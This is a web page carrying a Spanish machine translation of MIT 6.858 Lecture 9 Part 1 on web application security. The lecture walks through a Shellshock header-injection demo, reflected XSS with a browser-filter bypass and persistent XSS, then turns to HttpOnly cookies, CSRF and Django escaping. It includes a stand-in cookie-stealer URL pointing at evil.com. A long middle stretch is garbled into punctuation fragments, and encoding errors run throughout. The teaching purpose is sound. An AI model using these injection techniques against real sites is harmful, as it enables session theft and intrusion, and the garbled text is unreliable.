<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§∑üèª üñêüèº üßï Curso MIT "Seguridad de sistemas inform√°ticos". Lecci√≥n 9: Seguridad de aplicaciones web, Parte 1 ü§üüèª üëåüèº üöø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Instituto de Tecnolog√≠a de Massachusetts. Conferencia Curso # 6.858. "Seguridad de los sistemas inform√°ticos". Nikolai Zeldovich, James Mickens. A√±o 2...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Curso MIT "Seguridad de sistemas inform√°ticos". Lecci√≥n 9: Seguridad de aplicaciones web, Parte 1</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ua-hosting/blog/424289/"><h3>  Instituto de Tecnolog√≠a de Massachusetts.  Conferencia Curso # 6.858.  "Seguridad de los sistemas inform√°ticos".  Nikolai Zeldovich, James Mickens.  A√±o 2014 </h3><br>  Computer Systems Security es un curso sobre el desarrollo e implementaci√≥n de sistemas inform√°ticos seguros.  Las conferencias cubren modelos de amenazas, ataques que comprometen la seguridad y t√©cnicas de seguridad basadas en trabajos cient√≠ficos recientes.  Los temas incluyen seguridad del sistema operativo (SO), caracter√≠sticas, gesti√≥n del flujo de informaci√≥n, seguridad del idioma, protocolos de red, seguridad de hardware y seguridad de aplicaciones web. <br><br>  Lecci√≥n 1: "Introducci√≥n: modelos de amenaza" <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 3</a> <br>  Lecci√≥n 2: "Control de ataques de hackers" <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 3</a> <br>  Lecci√≥n 3: ‚ÄúDesbordamientos del b√∫fer: exploits y protecci√≥n‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 3</a> <br>  Lecci√≥n 4: ‚ÄúSeparaci√≥n de privilegios‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 3</a> <br>  Lecci√≥n 5: ‚Äú¬øDe d√≥nde vienen los sistemas de seguridad?‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> <br>  Lecci√≥n 6: ‚ÄúOportunidades‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 3</a> <br>  Lecci√≥n 7: ‚ÄúSandbox de cliente nativo‚Äù <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 3</a> <br>  Lecci√≥n 8: "Modelo de seguridad de red" <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 3</a> <br>  Lecci√≥n 9: "Seguridad de aplicaciones web" <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 1</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 2</a> / <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Parte 3</a> <a name="habracut"></a><br><br>  Comencemos la segunda conferencia en nuestra incre√≠ble serie de historias de seguridad web.  Me gustar√≠a proceder inmediatamente a una r√°pida demostraci√≥n de ejemplos, ya que sabe que nuestras demostraciones casi nunca funcionan.  Espero que no veas una pantalla en blanco hoy. <br><br>  La idea b√°sica es que primero me gustar√≠a mostrarle un ejemplo de un error Shellshock del que quiz√°s ya haya o√≠do hablar.  Este fue un tema bastante popular en la literatura sobre seguridad inform√°tica. <br><br><img src="https://habrastorage.org/webt/kk/h0/hz/kkh0hzlvc4krqxabzmnwigajxo4.jpeg"><br><br>  Las personas le dan a un error Heartbleed una calificaci√≥n m√°xima de 10 en una escala de peligro 10. Consideran que este es el error m√°s peligroso contra el cual el sistema de seguridad debe proteger.  Pens√© que ser√≠a una gran idea mostrarte una historia viva de este problema que puedes contarles a tus padres para que entiendan que estudiar en el Instituto de Tecnolog√≠a de Massachusetts vale la pena. <br><br>  Entonces, ¬øcu√°l es la idea principal del error Shellshock?  Este es un gran ejemplo de por qu√© es tan dif√≠cil crear aplicaciones web seguras que abarcan m√∫ltiples tecnolog√≠as, m√∫ltiples idiomas, m√∫ltiples sistemas operativos, y as√≠ sucesivamente.  Por lo tanto, la idea principal es que Shellshock utiliza el hecho de que un atacante puede crear una solicitud http especial para el servidor y administrar los encabezados en esta solicitud.  Escrib√≠ un ejemplo muy simple en la pizarra. <br>  Supongamos que un atacante quiere enviar una solicitud GET a un CGI sobre el tema de la b√∫squeda de gatos, porque esto es exactamente lo que la gente siempre busca en Internet (es broma).  Por lo tanto, habr√° un signo de interrogaci√≥n y alg√∫n tipo de encabezado de host est√°ndar con una URL, por ejemplo, example.com: <br><br>  OBTENER /querry.cgi?  b√∫squeda = gatos <br>  Anfitri√≥n: ejemplo.com <br>  Personalizado - encabezado: Personalizado - valor <br><br>  Ahora tenga en cuenta que un atacante tambi√©n puede especificar encabezados personalizados.  Por ejemplo, quiero encontrar alg√∫n tipo de encabezado espec√≠fico de la aplicaci√≥n llamado Encabezado personalizado para especificar alg√∫n valor personalizado all√≠, porque la aplicaci√≥n web puede definir alguna funcionalidad que no puede expresarse usando encabezados HTTP predefinidos simples.  Entonces, aunque todo esto parece bastante inofensivo. <br>  Pero al final, lo que sucede es que muchos de estos servidores web para procesar secuencias de comandos CGI aceptar√°n estos valores personalizados del encabezado de valores personalizados y los usar√°n para establecer variables de entorno Bash.  Es decir, utilizar√°n este encabezado personalizado para crear un encabezado personalizado para el nombre de la variable Bash, tomar√°n este valor personalizado proporcionado por el atacante y lo usar√°n como el valor de la variable Bash.  Una vez que se establece esta variable, el servidor CGI procesar√° el contexto de este entorno. <br><br>  Y esto es malo porque los servidores web no deber√≠an tomar valores arbitrarios de estas cosas "sucias" aleatorias.  Por lo tanto, en un ejemplo espec√≠fico de un error de Shellshock, lo que sucede es que si le da a la variable Bash alg√∫n valor malicioso, puede comenzar una forma de locura. <br><br><img src="https://habrastorage.org/webt/pt/e_/26/pte_26a2d3abmngljp3z9rwoiwa.jpeg"><br><br>  B√°sicamente, esta definici√≥n maliciosa de una funci√≥n se elige en el lenguaje de script Bash, y no debe molestarse por los detalles de este proceso.  Pero el hecho es que si el par√°metro Bash se configurara correctamente, esta parte de / bin / id no se ejecutar√≠a.  As√≠ que acaba de definir alg√∫n tipo de funci√≥n tonta que no hace nada y termina el proceso de consulta. <br><br>  Sin embargo, esta secuencia de caracteres confunde al analizador Bash; parece tropezar con estas tonter√≠as ubicadas despu√©s de la barra.  Y luego dice: "Oh, podr√≠a seguir analizando y ejecutando algunos comandos aqu√≠, ¬øverdad?"  Y en este caso, simplemente ejecuta el comando bin / id, que muestra informaci√≥n sobre el usuario.  Pero la esencia de la vulnerabilidad es que, en lugar de bin / id, ¬°puede poner absolutamente cualquier c√≥digo aqu√≠! <br><br>  Dar√© un ejemplo muy simple que ver√°s en la pantalla.  Este es un servidor Python muy simple, el m√°s f√°cil que puedas imaginar.  Yo uso el m√©todo GET aqu√≠.  Este m√©todo significa iterar sobre todos los encabezados HTTP en la solicitud. <br><br><img src="https://habrastorage.org/webt/w4/3c/fw/w43cfwwaqjmmjxm78zug-oecus4.jpeg"><br><br><img src="https://habrastorage.org/webt/1m/mr/jf/1mmrjfhbdbu6-kpevbe24bsmhpg.jpeg"><br><br>  Aqu√≠ en el encabezado tenemos un valor para la variable K y un valor para la consulta V. En este caso, GET simplemente imprime los encabezados que encuentra. <br><br>  Y luego har√° algo muy est√∫pido: hacer una llamada al sistema y establecer el valor de shell directamente en el valor indicado en el encabezado.  Entonces esta es toda la ra√≠z de la vulnerabilidad. <br><br>  Si voy a la siguiente pesta√±a y ejecuto el servidor web de la v√≠ctima, vemos que est√° listo para aceptar solicitudes. <br><br><img src="https://habrastorage.org/webt/rk/jt/zg/rkjtzg52m6abnpspbgoyltcpzmc.jpeg"><br><br>  Entonces puedo escribir mi cliente Shellshock especial: se encuentra en la siguiente pesta√±a. <br><br><img src="https://habrastorage.org/webt/jv/jh/hc/jvjhhchuelxbtmdnkrdos_apl_0.jpeg"><br><br>  De hecho, es bastante simple: solo defino una de estas l√≠neas de ataque malicioso.str, por lo que primero tiene esos valores "curvos".  Y luego s√© que en el lado del servidor ahora todo se har√° de acuerdo a mi voluntad. <br><br>  En este caso, us√© algo inofensivo: repite "Soy due√±o de tu auto".  Pero podr√≠a haber cualquier cosa.  Puede ejecutar otro shell Bash con el par√°metro "echo ATTACKER CMD", es decir, el comando del atacante real, que puede ser muy peligroso. <br><br>  Entonces, configuro los encabezados y la solicitud del usuario, y luego solo uso Python para crear una conexi√≥n HTTP y simplemente enviarla al servidor.  Entonces, ¬øqu√© pasa al final?  Estoy ejecutando mi cliente Shellshock aqu√≠. <br><br><img src="https://habrastorage.org/webt/li/y5/pf/liy5pfnb9rji1s51vi7vvwwn4bs.jpeg"><br><br>  Ver√°, el error 404 apareci√≥ aqu√≠, porque no importa qu√© archivo solicit√©, simplemente inserto aqu√≠ alg√∫n tipo de √≠ndice que no existe HTML.  Pero si mira aqu√≠, en la segunda pesta√±a, donde mostramos el servidor web de la v√≠ctima que acord√≥ conectarse a trav√©s del puerto 8282, veremos que recibi√≥ mis mensajes "Soy due√±o de su autom√≥vil" y ATTACKER CMD. <br><br><img src="https://habrastorage.org/webt/6t/kf/yp/6tkfyptepbhu83ggs2shp_20dys.jpeg"><br><br>  Debido a que tan pronto como el servidor de la v√≠ctima recibi√≥ este encabezado, estableci√≥ inmediatamente los valores de la variable Bash y, como resultado, se lanz√≥ el comando ATTACKER CMD.  ¬øEso est√° claro? <br><br>  <b>Audiencia:</b> ¬øesto sucede si un programa comienza con ese t√≠tulo? <br><br>  <b>Profesor:</b> si.  Por lo tanto, los detalles de c√≥mo funciona el ataque depende de c√≥mo se vea su servidor web, por ejemplo, si trabaja con Apache o no.  Este ejemplo es un poco exagerado, ya que en realidad cre√© otro shell Bash, establec√≠ una variable de shell y solo entonces comenc√© el proceso.  Pero podr√≠a imaginar que si creara otros procesos para cada conexi√≥n entrante, podr√≠a establecer la variable de entorno directamente. <br><br>  <b>P√∫blico: por lo</b> tanto, si vuelve al c√≥digo del servidor web, parece que hay una vulnerabilidad mucho peor que Shellshock.  Debido a que puede realizar una llamada al sistema y ejecutar el comando simplemente configurando el encabezado personalizado a otra cosa, y no tendr√≠a que usar el error Shellshock en este ejemplo. <br><br>  <b>Profesor:</b> s√≠, es cierto, en este servidor web en particular, que escrib√≠ solo como ejemplo, hay algo en lo que no se puede confiar para nada.  Pero si aqu√≠ no tuvi√©ramos Python, sino Apache, entonces podr√≠amos establecer directamente el valor del entorno para cualquier servicio en particular usando el en√©simo par√°metro establecido.  Pero hay servidores como este que crean un proceso separado y hacen algo muy similar al ejemplo dado. <br><br><img src="https://habrastorage.org/webt/js/s4/zz/jss4zz4vwyw6dqz-4s0kzwlr-uy.jpeg"><br><br>  Otro ejemplo que quer√≠a darle es el ejemplo de secuencias de comandos entre sitios.  El error de Shellshock fue un tipo de ejemplo de lo importante que es la desinfecci√≥n del contenido.  Discutimos el hecho de que no solo debe aceptar la entrada de personas aleatorias y usarla directamente en equipos de cualquier tipo. <br><br>  Las secuencias de comandos entre sitios son otro ejemplo que muestra por qu√© algo puede salir mal.  En este ejemplo, tengo otro servidor CGI simple escrito en Python. <br><br><img src="https://habrastorage.org/webt/lp/oo/aw/lpooaw-togbyuns6zaxta0lp6ei.jpeg"><br><br>  Este es el identificador que se ejecuta cuando se recibe una solicitud del cliente.  Imprim√≠ algunos encabezados aqu√≠ para la respuesta, y mi respuesta ser√° texto HTML.  Como resultado, los navegadores tienen algunos mecanismos de seguridad para tratar de prevenir el ataque que les mostrar√©.  Por lo tanto, hice posible desactivar algunos de los mecanismos de esta protecci√≥n colocando esta barra de t√≠tulo al principio. <br><br>  El script CGI luego obtiene acceso a todos los campos y solicitudes CGI, comenzando con la l√≠nea form = cgi.FieldStorage ().  Imagine que todo lo que se encuentra en la l√≠nea despu√©s de este signo de interrogaci√≥n representa el t√≠tulo y los par√°metros de nuestro ejemplo: <br><br>  OBTENER /querry.cgi?  b√∫squeda = gatos <br>  Anfitri√≥n: ejemplo.com <br>  Personalizado - encabezado: Personalizado - valor <br><br>  Luego, el script cgi hace algo muy simple: imprime inmediatamente el valor de algo que vino del atacante.  Esta es la misma idea b√°sica, y esta es una mala idea, porque esta funci√≥n de impresi√≥n imprime el valor resultante directamente en el propio HTML. <br><br>  Aqu√≠ puede suceder lo siguiente.  Supongamos que tengo un mont√≥n de consultas que quiero ejecutar.  En esta primera solicitud, simplemente configuro el valor del mensaje en Hola, es decir, voy a la direcci√≥n de la primera l√≠nea. <br><br><img src="https://habrastorage.org/webt/q2/xl/ng/q2xlngmnjiyfdvdytmh2gfdoymq.jpeg"><br><br>  Por lo tanto, si voy a mi p√°gina, ver√© la palabra hola, porque el servidor acepta directamente lo que le paso e imprime "hola".  Entonces no hay sorpresas. <br><br><img src="https://habrastorage.org/webt/1t/0n/ak/1t0nakmsjq1emmcqj03bs9sosq0.jpeg"><br><br>  Entiendo que realmente puedo pasar c√≥digo HTML arbitrario all√≠, y si configuro el formato para el encabezado h1, es decir, enviar√© la segunda l√≠nea que termina en hola al servidor, tambi√©n cambiar√° en la p√°gina; ya ves, el estilo de la palabra ha cambiado al estilo del encabezado h1.  Entonces funciona, escribo los valores directamente en la p√°gina. <br><br><img src="https://habrastorage.org/webt/gm/qy/mv/gmqymv3fbxpjzkxa5wwdvijx7vu.jpeg"><br><br>  Genial, ahora estamos en el negocio, y eso es genial.  Ahora, simplemente agreguemos el c√≥digo JavaScript, es decir, ejecute la tercera l√≠nea preparada por m√≠ en el navegador, donde se inserta un cierto script, que se ejecuta despu√©s del par√°metro de alerta ("XSS"). <br><br>  Entonces ahora vemos una pantalla en blanco.  Parece que no tuvimos √©xito, porque no hay salida visible, y no not√© ninguna advertencia. <br><br><img src="https://habrastorage.org/webt/hd/mo/qr/hdmoqr8xk5ehtmumjddzqwrquns.jpeg"><br><br>  Pero si miro el resultado del servidor web, ver√© que el servidor web en s√≠ no recibi√≥ esta etiqueta de script final.  Parece que el navegador en s√≠ mismo detect√≥ algo malvado, aunque intent√© desactivar el filtro XSS.  Entonces es bastante interesante.  M√°s adelante veremos m√°s de cerca este mecanismo de protecci√≥n, pero por ahora notar√© que el navegador est√° tratando de resistir el ataque de secuencias de comandos entre sitios. <br><br>  Pero puede aprovechar el hecho de que HTML, CSS y JavaScript son lenguajes extremadamente complejos y est√°n escritos de una manera dif√≠cil de entender.  Aprovechar√© esto y usar√© la √∫ltima, cuarta l√≠nea de mi entrada, coloc√°ndola en la barra de direcciones del navegador.  Esta es una cadena de ataque que contiene una URL no v√°lida.  Incluye la URL de la imagen &lt;IMG "" "&gt; y la etiqueta del script"&gt; y en realidad no se puede analizar.  Por lo tanto, al recibir dicha l√≠nea, el navegador simplemente se confunde y muestra informaci√≥n en la pantalla: "La p√°gina en 127.0.0.1:8282 dice: XSS".  Por lo tanto, la detecci√≥n de secuencias de comandos entre sitios incorporada no funciona realmente. <br><br><img src="https://habrastorage.org/webt/zh/sa/df/zhsadfxqyr1nqiwiy8atytitmou.jpeg"><br><br>  Si hacemos clic en el bot√≥n "Aceptar", solo tendremos una p√°gina en blanco.  Pero si observa su contenido, veremos citas y par√©ntesis incomprensibles que vienen de la nada. <br><br><img src="https://habrastorage.org/webt/za/qi/yp/zaqiyp6lxm9damgqbidbi7ess3u.jpeg"><br><br>  Sin embargo, desde el punto de vista del atacante, la p√°gina da√±ada no importa, porque vimos una advertencia, lo que significa que se lanz√≥ el c√≥digo.  Y podr√≠a usarse para robar cookies o hacer algo as√≠. <br><br>  <b>Audiencia:</b> ¬øcu√°l es el aspecto entre sitios? <br><br>  <b>Profesor: El</b> aspecto entre sitios es que si un atacante puede convencer a un usuario de ir a una URL, como en este ejemplo, entonces √©l es la persona que determina el contenido del mensaje.  Es √©l quien crea la advertencia XSS o algo as√≠.  Esencialmente, lo que sucede es que la p√°gina de la v√≠ctima ejecuta c√≥digo en nombre de alguien que no administra esta p√°gina. <br><br>  Entonces, te mostr√© dos demostraciones r√°pidas del mundo "sucio" en el que vivimos.  Entonces, ¬øpor qu√© las secuencias de comandos entre sitios son tan comunes?  ¬øPor qu√© son tan importantes estos problemas?  La raz√≥n es que los sitios web se est√°n volviendo cada vez m√°s din√°micos y desean alojar contenido generado por m√∫ltiples usuarios o incluir contenido de otros dominios.  Piense, por ejemplo, en la secci√≥n de comentarios de un art√≠culo de noticias, estos comentarios provienen de personas poco confiables, de usuarios.  De una forma u otra, estos sitios deber√≠an descubrir cu√°les son las reglas para combinar tales cosas. <br><br>  Los sitios web pueden contener documentos de usuario, como documentos de Google u Office 365. Todos estos documentos provienen de personas poco confiables, pero de alguna manera necesitan llevarse bien entre s√≠ y con la gran infraestructura de Google o Microsoft. <br><br>  ¬øQu√© tipos de escenarios de seguridad entre sitios podemos usar?  Un tipo de protecci√≥n son los filtros de secuencias de comandos entre sitios en el navegador.  Estos filtros intentar√°n detectar posibles ataques de secuencias de comandos entre sitios.  Y vimos uno de estos filtros en acci√≥n: este fue el tercer ejemplo del escenario que examinamos. <br>  Supongamos que tiene la URL <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">foo.com/?q=</a> &lt;script src = "evil.com/cookie stealer.js"&gt;.  Es decir, esta direcci√≥n ejecuta un script que redirige al usuario a un sitio malicioso y le roba cookies. <br><br><img src="https://habrastorage.org/webt/no/hf/b_/nohfb_nyupptbxwj4luk1whqgpw.jpeg"><br><br>  Por lo tanto, el navegador se negar√° a ejecutarlo y el truco de este atacante no funcionar√°.  La raz√≥n es simple: el navegador simplemente verific√≥ si hab√≠a una <code>&lt;script&gt;</code> incorporada en esta URL y, al encontrarla, prohibi√≥ hacer clic en este enlace.  Por lo tanto, esta es una heur√≠stica muy simple para descubrir si algo da√±ino est√° sucediendo, porque ning√∫n desarrollador normal pondr√° esas cosas en la direcci√≥n.  Puede configurar las opciones de configuraci√≥n de su navegador para habilitar o deshabilitar tales cosas.  Esto a veces es √∫til para realizar pruebas si solo desea ingresar r√°pidamente y sin mucha verificaci√≥n algunos datos de JavaScript.  Pero, por lo general, esta verificaci√≥n en el navegador est√° habilitada de forma predeterminada. <br><br>  Por ejemplo, Chrome e IE tienen un filtro incorporado que analiza el valor de la URL en la barra de direcciones y busca cosas similares.  Y si est√°n all√≠, entonces el navegador puede intentar eliminarlos por completo o dejar vac√≠a la fuente dentro de &lt;&gt;.  Existen muchos m√©todos de an√°lisis heur√≠sticos basados ‚Äã‚Äãen qu√© navegadores deber√≠an detectar tales cosas.  Y si nos fijamos en el sitio web de OWASP, hay ejemplos del uso de una heur√≠stica para detectar secuencias de comandos entre sitios y ejemplos de c√≥mo omitir este filtro. <br><br>  Sabes, fue muy divertido, porque al principio, como ejemplo para nuestra conferencia, hice algo similar a esto, y no funcion√≥.  Luego busqu√© en la hoja de trucos de OWASP y encontr√© la cuarta opci√≥n que funcionaba, era un ejemplo con un an√°lisis roto de la direcci√≥n de la imagen img. <br><br>  Por lo tanto, el problema principal, que no le permite confiar simplemente en los filtros incorporados del navegador, es que hay muchas maneras diferentes de obligar a los analizadores CSS y HTML a analizar parte del contenido de manera incorrecta.  Por lo tanto, las soluciones integradas no son perfectas, no cubren todas las vulnerabilidades. <br><br>  <b>Audiencia: ¬ø</b> Pero no es responsabilidad del navegador verificar tales cosas? <br><br>  <b>Profesor:</b> Me refiero al caso cuando el navegador est√° en un servidor proxy y el proxy hace algo que se muestra en este ejemplo.  Es decir, los filtros incorporados tienen sentido, porque puede haber muchos analizadores dentro del navegador, y estos filtros se utilizan para proteger las capas de controlador dentro del navegador. <br><br>  <b>Audiencia:</b> Creo que podemos decir que es responsabilidad del desarrollador web, no del usuario, verificar tales cosas. <br><br>  <b>Profesor:</b> en cierto sentido, podr√≠amos decir que en Unix o Windows tambi√©n hay procesos que el desarrollador de software, y no el usuario, deben encargarse, y el desarrollador debe asegurarse de que estas cosas permanezcan aisladas.  Pero en realidad, el sistema operativo y el hardware tambi√©n juegan un papel importante, porque de lo contrario no se podr√≠a confiar en ning√∫n programa realizado por desarrolladores aleatorios.  Pero b√°sicamente tienes raz√≥n.  De hecho, marcos como Django o algo similar est√°n tratando de ayudarlo a solucionar algunos de estos problemas. <br><br>  De una forma u otra, los filtros no son una soluci√≥n ideal y no pueden evitar lo que se conoce como ataques persistentes o persistentes de secuencias de comandos entre sitios, XSS persistente.  Este es un tipo de reflexi√≥n, porque el c√≥digo del script simplemente "vive" en la URL.  Tan pronto como el usuario cerr√≥ esta URL, el ataque termin√≥. <br><br>  Pero imagine que un usuario ha colocado HTML malicioso en la secci√≥n de comentarios de su sitio.         ,          .           ,      . <br><br><img src="https://habrastorage.org/webt/ve/bq/zh/vebqzhebjjzb__fbvhmhga2tav0.jpeg"><br><br>  ,     ‚Äì   .           HTML-   . <br><br>    ?  - ,          .        HTML,   ,       .         . <br><br> <b>:</b>  ,    , ,  ,           -   ? <br><br> <b>:</b>    ,      .   ,     ‚Äî post.  ,   ,   XML HTTP . <br><br> <b>:</b>      ,          ,  ‚Ä¶ <br><br> <b>:</b> ,     ,      .  ,                 .      - ,    . <br><br>  ,    ,         . <br><br>       ,   ¬´ HTTP ¬ª,  HTTP-only cookie.     ,     ,    JavaScript        cookie.  ,  ,          , : ¬´,    ,  JavaScript,     cookie¬ª!         - . <br><br>     ,        ,    .     ,      .  ,    JavaScript     cookie,     - , ,  URL-  -   , , buy.com.      ,   , ,  Ferrari,        attacker,    . <br><br><img src="https://habrastorage.org/webt/3q/nz/v2/3qnzv2vakvuorhnvqzgzonxubvw.jpeg"><br><br>    ,  JavaScript,      cookie,  ,       URL-.  ,     CSRF ,      . <br><br>   ,     ,      ,   .    ,         ,    . ,  -   ,   ,     ,  Google, Office 365   .         . , Google              googleusercontent.com.      ,  Gmail   . -,      25-   . <br><br><img src="https://habrastorage.org/webt/xz/b0/r7/xzb0r7kx8ebddto0pynf4cuoyn4.jpeg"><br><br>       ?  ,          -     ,              google.com.     ,              google.com.          . <br><br>  ,     ‚Äì     .   ,       -,    ,     .       ,                 .   ‚Äî   Django.   -, ,          -. <br><br><img src="https://habrastorage.org/webt/hh/tk/em/hhtkemhitqft99764mtwlvwzssi.jpeg"><br><br> Django     ,      ,           .          ‚Äì   .             CSS   ,       . ,        .  Django    ,    :   ,   . <br><br><img src="https://habrastorage.org/webt/m7/t-/tt/m7t-tthgw-nmrsbhzx0z0r_8wwi.jpeg"><br><br>    -.    ,       Django,  Django : ¬´,     -, ,  ,    CGI¬ª.    Django     ,       ,     .  -   CGI0,    ,         . <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sin embargo, Django lo hace mucho mejor: desinfecta el contenido del usuario, ya que espera un truco. </font><font style="vertical-align: inherit;">Simplemente coloca inmediatamente el valor de la variable de nombre aqu√≠, y lo codifica de tal manera que este contenido nunca pueda salir del contexto HTML y ejecutar c√≥digo JavaScript o algo as√≠. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26:25 min</font></font><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Curso MIT "Seguridad de sistemas inform√°ticos".</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Lecci√≥n 9: "Seguridad de aplicaciones web", Parte 2</a> <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/6HhmIlbE0l0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  La versi√≥n completa del curso est√° disponible <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . <br><br>  Gracias por quedarte con nosotros.  ¬øTe gustan nuestros art√≠culos?  ¬øQuieres ver m√°s materiales interesantes?  <b>Ap√≥yenos</b> haciendo un pedido o recomend√°ndolo a sus amigos, un <b>descuento del 30% para los usuarios de Habr en un an√°logo √∫nico de servidores de nivel de entrada que inventamos para usted:</b> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">toda la verdad sobre VPS (KVM) E5-2650 v4 (6 n√∫cleos) 10GB DDR4 240GB SSD 1Gbps de $ 20 o c√≥mo dividir el servidor?</a>  (las opciones est√°n disponibles con RAID1 y RAID10, hasta 24 